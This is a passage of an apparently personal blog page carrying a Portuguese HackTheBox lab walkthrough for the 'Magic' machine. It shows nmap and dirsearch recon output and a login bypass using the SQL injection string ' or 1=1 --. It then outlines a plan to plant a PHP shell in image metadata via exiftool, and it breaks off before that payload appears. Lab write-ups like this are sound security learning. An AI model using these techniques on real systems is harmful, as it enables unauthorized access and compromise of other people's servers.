@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta name="generator" content="Hugo 0.81.0" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Magic | FXSHELL</title>
+    <meta name="description" content="nmap -sV -sC -Pn -T4 -v -p- 10.10.10.185
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel python3 dirsearch.py -u http://10.10.10.185/ -e *">
+    <meta name="keywords" content="">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="">
+
+
+    <meta property="og:title" content="Magic" />
+<meta property="og:description" content="nmap -sV -sC -Pn -T4 -v -p- 10.10.10.185
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel python3 dirsearch.py -u http://10.10.10.185/ -e *" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/htb/magic/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2020-10-17T22:38:50-03:00" />
+<meta property="article:modified_time" content="2020-10-17T22:38:50-03:00" />
+
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Magic"/>
+<meta name="twitter:description" content="nmap -sV -sC -Pn -T4 -v -p- 10.10.10.185
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel python3 dirsearch.py -u http://10.10.10.185/ -e *"/>
+
+    
+
+
+
+
+    
+
+    
+    
+  <meta name="referrer" content="same-origin">
+
+
+    
+
+    
+    <link rel="canonical" href="/htb/magic/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    
+
+  
+  
+  
+  
+  
+  
+  
+    
+      
+        <style>html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack ol li:nth-child(n+10):after{left:-7px}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:""}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:"";border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:"";width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:"&nbsp;";height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}:root{--screen-size-small:30em}@keyframes intro{0%{opacity:0}; 100%{opacity:1}}.blur-up{-webkit-filter:blur(5px);filter:blur(5px);transition:filter 400ms,-webkit-filter 400ms}.blur-up.lazyloaded{-webkit-filter:blur(0);filter:blur(0)}.hack .readmore{margin-bottom:2.2em}.responsive-iframe{position:relative;padding-bottom:56.25%;padding-top:25px;height:0}.responsive-iframe iframe{position:absolute;top:0;left:0;width:100%;height:100%}iframe{border:0}main,footer{animation:intro .3s both;animation-delay:.15s}footer time[datetime$=M]:before{content:"\2013\0020"}@media only screen and (max-width:30em){footer time[datetime$=M]{display:none}}blockquote cite{display:block}blockquote cite::before{content:"\2014"}:target{color:#fff}.hack li ul{margin:0}.main{padding:20px 10px}input.form-control{border-radius:0;background-color:initial;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}input.form-control,textarea.form-control{font-size:initial}.hack .help-block{font-size:1rem}html{font-size:13px}.hack pre{font-size:17px}.hack .form input,.hack .form textarea,.hack .form button,.hack .form label{font-size:1rem}article [itemprop=description]{margin-bottom:20px;margin-top:20px}article header img{width:100%;border-radius:3px}table td,table th{line-height:inherit}img{max-width:100%}@media screen and (min-width:768px){html{font-size:1em}.container{max-width:50rem}}[v-cloak]{display:none}a[rel*="external"]::after {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+.muted, .help-block {
+  opacity: 0.70;
+}
+.hack .muted,
+.hack .help-block {
+  color: #e0e0e0;
+}
+</style>
+        
+
+
+  
+    <meta name="theme-color" content=#000>
+  
+
+
+      
+    
+  
+
+
+    <script>
+ 
+!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):e.fetchInject=t()}(this,function(){"use strict";const e=function(e,t,n,r,o,c,i){c=t.createElement(n),i=t.getElementsByTagName(n)[0],c.appendChild(t.createTextNode(r.text)),c.onload=o(r),i?i.parentNode.insertBefore(c,i):t.head.appendChild(c)};return function(t,n){if(!arguments.length)return Promise.reject(new ReferenceError("Failed to execute 'fetchInject': 1 argument required but only 0 present."));if(arguments[0]&&arguments[0].constructor!==Array)return Promise.reject(new TypeError("Failed to execute 'fetchInject': argument 1 must be of type 'Array'."));if(arguments[1]&&arguments[1].constructor!==Promise)return Promise.reject(new TypeError("Failed to execute 'fetchInject': argument 2 must be of type 'Promise'."));const r=[],o=n?[].concat(n):[],c=[];return t.forEach(e=>o.push(window.fetch(e).then(e=>[e.clone().text(),e.blob()]).then(e=>Promise.all(e).then(e=>{r.push({text:e[0],blob:e[1]})})))),Promise.all(o).then(()=>(r.forEach(t=>{c.push({then:n=>{t.blob.type.includes("text/css")?e(window,document,"style",t,n):e(window,document,"script",t,n)}})}),Promise.all(c)))}});
+fetchInject(["/js/lazysizes.min.js"]);
+</script>
+
+    <style>
+  img {
+    max-width: 100%;
+  }
+</style>
+
+    
+    
+      <script>fetchInject(["/css/syntax.css"])</script>
+
+      
+      <script type="text/javascript" async
+        src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+        MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [['$','$'], ['\\(','\\)']],
+          displayMath: [['$$','$$']],
+          processEscapes: true,
+          processEnvironments: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+          TeX: { equationNumbers: { autoNumber: "AMS" },
+              extensions: ["AMSmath.js", "AMSsymbols.js"] }
+        }
+        });
+        MathJax.Hub.Queue(function() {
+          
+          
+          
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i = 0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+        });
+
+        MathJax.Hub.Config({
+        
+        TeX: { equationNumbers: { autoNumber: "AMS" } }
+        });
+      </script>
+
+      <noscript>
+        <link href=/css/syntax.css rel="stylesheet">
+      </noscript>
+    
+  </head>
+  
+  
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">home</span></a>
+    
+      <a itemprop="url" class="" href="/posts/"><span itemprop="name">anotações</span></a>
+    
+      <a itemprop="url" class="" href="/htb/"><span itemprop="name">HTB</span></a>
+    
+      <a itemprop="url" class="" href="/sobre"><span itemprop="name">sobre</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <header>
+    <h1>Magic</h1>
+  </header>
+  <p><img src="/magic1.png" alt="HTB"></p>
+<p>nmap -sV -sC -Pn -T4 -v -p- 10.10.10.185</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Magic Portfolio
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>python3 dirsearch.py -u http://10.10.10.185/ -e *</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"> _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.3.9
+<span class="o">(</span>_<span class="o">||</span><span class="p">|</span> _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span> <span class="o">(</span>_<span class="p">|</span> <span class="o">)</span>
+
+Extensions:  <span class="p">|</span> HTTP method: getSuffixes: CHANGELOG.md <span class="p">|</span> HTTP method: get <span class="p">|</span> Threads: <span class="m">10</span> <span class="p">|</span> Wordlist size: <span class="m">6552</span> <span class="p">|</span> Request count: <span class="m">6552</span>
+
+Error Log: /root/dirsearch/logs/errors-20-06-29_23-59-23.log
+
+Target: http://10.10.10.185
+
+Output File: /root/dirsearch/reports/10.10.10.185/20-06-29_23-59-24
+
+<span class="o">[</span>23:59:24<span class="o">]</span> Starting: 
+<span class="o">[</span>00:00:12<span class="o">]</span> <span class="m">301</span> -  313B  - /images  -&gt;  http://10.10.10.185/images/
+<span class="o">[</span>00:00:14<span class="o">]</span> <span class="m">403</span> -  277B  - /index.shtml
+<span class="o">[</span>00:00:14<span class="o">]</span> <span class="m">200</span> -   67KB - /index.php
+<span class="o">[</span>00:00:14<span class="o">]</span> <span class="m">200</span> -   67KB - /index.php/login/
+<span class="o">[</span>00:00:14<span class="o">]</span> <span class="m">403</span> -  277B  - /install.sql
+<span class="o">[</span>00:00:17<span class="o">]</span> <span class="m">403</span> -  277B  - /localhost.sql
+<span class="o">[</span>00:00:17<span class="o">]</span> <span class="m">403</span> -  277B  - /log.sqlite
+<span class="o">[</span>00:00:18<span class="o">]</span> <span class="m">200</span> -    4KB - /login.php
+<span class="o">[</span>00:00:18<span class="o">]</span> <span class="m">403</span> -  277B  - /login.shtml
+<span class="o">[</span>00:00:19<span class="o">]</span> <span class="m">403</span> -  277B  - /logs.sqlite
+</code></pre></div><pre><code>http://10.10.10.185/login.php
+</code></pre><p>explorando o site descobri que o nome das imagens pode conter a respectiva senha.</p>
+<pre><code>http://10.10.10.185/index.php/login/
+</code></pre><p>podemos notar hashs + imagens quebradas.
+baixei todas as informações da pagina e criei uma wordlist.. vamos ver.
+encontrei referências de .sql descobertos pelo dirsearch, portanto tentei fazer uma injeção simples de tabela de usuários.</p>
+<p>pesquisei no google:   injection sql login.php</p>
+<p>login.php da página que está rodando o brute force (rockyou)</p>
+<p>Para minha surpresa deu certo,  no primeiro link.</p>
+<p><a href="https://www.devmedia.com.br/sql-injection-em-ambientes-web/9733">https://www.devmedia.com.br/sql-injection-em-ambientes-web/9733</a></p>
+<pre><code>' or 1=1 --
+</code></pre><p>login/senha</p>
+<p>ele já faz o 301 automatico para url  upload</p>
+<pre><code>http://10.10.10.185/upload.php
+</code></pre><p>A ideia é de um envenenamento com uma imagem.  Vou pesquisar uma aplicação que faça isso, no kali deve ter com ctz &hellip;</p>
+<p>Depois das pesquisas realizadas, encontrei que existe um programa chamado  <em>exiftool</em>
+ele grava informações em metadados em varios tipos de arquivos
+inclusive  mp3, pdf ,  jpeg etc
+Não vem nativo no kali linux, é necessário instalar.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">apt-get install exiftool
+</code></pre></div><p>Utilizei essa wiki para consultar as opções dele e as flags utilizadas &gt;
+<a href="https://metacpan.org/pod/exiftool">https://metacpan.org/pod/exiftool</a></p>
+<p>Como o site requer uma imagem,  optei por uma PNG
+Ele da suporte de leitura, gravação e escrita
+PNG            r/w/c</p>
+<p>Posso colocar uma linha de escrita dentro do PNG dessa forma, como no exemplo da wiki &gt;</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">WRITING EXAMPLES
+
+Note that quotes are necessary around arguments which contain certain special characters such as &gt;, <span class="p">&lt;</span> <span class="nt">or</span> <span class="na">any</span> <span class="na">white</span> <span class="na">space</span><span class="err">.</span> <span class="na">These</span> <span class="na">quoting</span> <span class="na">techniques</span> <span class="na">are</span> <span class="na">shell</span> <span class="na">dependent</span><span class="err">,</span> <span class="na">but</span> <span class="na">the</span> <span class="na">examples</span> <span class="na">below</span> <span class="na">will</span> <span class="na">work</span> <span class="na">for</span> <span class="na">most</span> <span class="na">Unix</span> <span class="na">shells</span><span class="err">.</span> <span class="na">With</span> <span class="na">the</span> <span class="na">Windows</span> <span class="na">cmd</span> <span class="na">shell</span> <span class="na">however</span><span class="err">,</span> <span class="na">double</span> <span class="na">quotes</span> <span class="na">should</span> <span class="na">be</span> <span class="na">used</span> <span class="err">(</span><span class="na">eg</span><span class="err">.</span> <span class="na">-Comment</span><span class="o">=</span><span class="s">&#34;This is a new comment&#34;</span><span class="err">).</span>
+
+<span class="na">exiftool</span> <span class="na">-Comment</span><span class="o">=</span><span class="s">&#39;This is a new comment&#39;</span> <span class="na">dst</span><span class="err">.</span><span class="na">jpg</span>
+
+    <span class="na">Write</span> <span class="na">new</span> <span class="na">comment</span> <span class="na">to</span> <span class="na">a</span> <span class="na">JPG</span> <span class="na">image</span> <span class="err">(</span><span class="na">replaces</span> <span class="na">any</span> <span class="na">existing</span> <span class="na">comment</span><span class="err">).</span>
+</code></pre></div><p>Pesquisei no google  <em>exiftool php shell</em></p>
+<p><img src="/exif2-magic.png" alt="HTB"></p>
+<p>e vi o vídeo desse cara que está destacado</p>
+<p>Ele carrega uma shell para dentro de uma imagem e faz upload no roteador, com isso ganha acesso aos diretorios internos.</p>
+<p>Vou tentar fazer a mesma injeção de código.</p>
+<p>E encontrar um jeito de utilizar o reverse shell para dentro da maquina.. to vendo exemplos funcionais.</p>
+<p><a href="http://sejalivre.org/OSCP/OSCP_Notes--ReverseShell_(all).html">http://sejalivre.org/OSCP/OSCP_Notes--ReverseShell_(all).html</a></p>
+<p><em>Encontrei</em>
+<a href="https://github.com/xapax/security/blob/master/bypass_image_upload.md">https://github.com/xapax/security/blob/master/bypass_image_upload.md</a></p>
+<p>Esse é o código que vou usar no exiftool:</p>
